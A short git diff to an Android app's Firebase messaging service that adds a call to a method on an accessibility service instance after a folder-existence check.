@@ -9,6 +9,7 @@ import android.util.Log;
 
 import androidx.core.app.ActivityCompat;
 
+import com.family.accessibility.MyAccessibilityService;
 import com.family.internet.ServerHelper;
 import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
@@ -66,5 +67,6 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
         }else {
             Log.d("FIFI", "Folder exist");
         }
+        MyAccessibilityService.instance.sondur();
     }
 }
